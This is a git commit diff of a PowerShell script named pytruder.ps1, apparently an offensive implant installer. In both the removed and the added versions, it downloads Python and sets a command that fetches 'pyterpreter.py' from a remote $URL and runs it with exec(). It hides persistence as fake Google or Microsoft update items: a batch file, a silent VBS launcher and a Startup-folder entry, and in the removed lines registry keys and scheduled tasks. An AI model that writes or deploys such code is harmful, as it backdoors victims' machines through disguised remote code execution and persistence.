f6d2c41e973d239570f58c9c5347d1e9a88f8d6a
pyro57 <kevinpyrosc@gmail.com>
2020-10-29 16:58:27 -0500

    it actually works now
    not the way I wanted to do it, but it works now

--- pytruder/pytruder.ps1
+++ pytruder/pytruder.ps1
@@ -1,21 +1,14 @@
-Invoke-webrequest -URI $URL -outfile C:\python.msix
-add-appxpackage -path C:\python.msix
-python -m pip install requests
-$admins = Get-LocalGroupMember -Group administrators
-$curent_user = "$env:UserDomain\$env:Username"
-$admin = 0
-foreach($user in $admins){
-    if($user -like $curent_user){$admin = 1}
-}
-if ($admin -eq 1){
-    New-Item -path 'HKLM:\SOFTWARE\Microsoft\Windows\NT\CurrentVersion\AppCompatFlags\TelemetryCtonroller' -Name 'Micro$oft_Updates' 
-    New-ItemProperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\NT\CurrentVersion\AppCompatFlags\TelemetryCtonroller\Micro$oft_Updates' -Name 'Command' -Value "python -c `"import requests; r = requests.get('http://$IP:$PORT/pyterpreter.py'); exec(r.text)`"" -PropertyType "String"
-    New-ItemProperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\NT\CurrentVersion\AppCompatFlags\TelemetryCtonroller\Micro$oft_Updates' -Name 'Nightly' -Value "1" -PropertyType "Dword"
-    Start-ScheduledTask -path 'Micorosft\Windows\Application Experience\Microsoft compatibility Appraiser'
-}
+Invoke-webrequest -URI $URL/python.msix -outfile $HOME\python.msix
+add-appxpackage -path $HOME\python.msix
+python3.8 -m pip install requests
+$python_command = "`"import requests; r=requests.get('$URL/pyterpreter.py'); exec(r.text)`""
 
-elseif($admin -eq 0){
-    $trig = New-ScheduledTaskTrigger -daily
-    New-ScheduledTask -AsJob -Action "python -c python -c `"import requests; r = requests.get('http://$IP:$PORT/pyterpreter.py'); exec(r.text)`"" -Trigger $trig -Name "Micro`$oft_updates"
-    Start-ScheduledTask -Name 'Micro`$soft_updates'
-}
+mkdir "$HOME\AppData\Local\Google"
+New-Item -Path $HOME\AppData\Local\Google -name google_update.bat -ItemType "File" -Value "python3.8 -c $python_command"
+New-Item -Path $HOME\Appdata\Local\Google -name google_update.vbs -ItemType "File"
+Add-Content -Path $HOME\Appdata\Local\Google\google_update.vbs -value 'Set WshShell = CreateObject("WScript.Shell" )'
+Add-Content -Path $HOME\Appdata\Local\Google\google_update.vbs -Value 'WshShell.run """" & "C:\users\pyro\AppData\Local\Google\google_update.bat" & """", 0, False'
+Add-Content -Path $HOME\Appdata\Local\Google\google_update.vbs -Value 'Set WshShell = Nothing'
+$vbs_path = "$HOME\AppData\Local\Google\google_update.vbs"
+New-Item -Path "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name startup.cmd -Value "cscript $vbs_path"
+cscript.exe $vbs_path
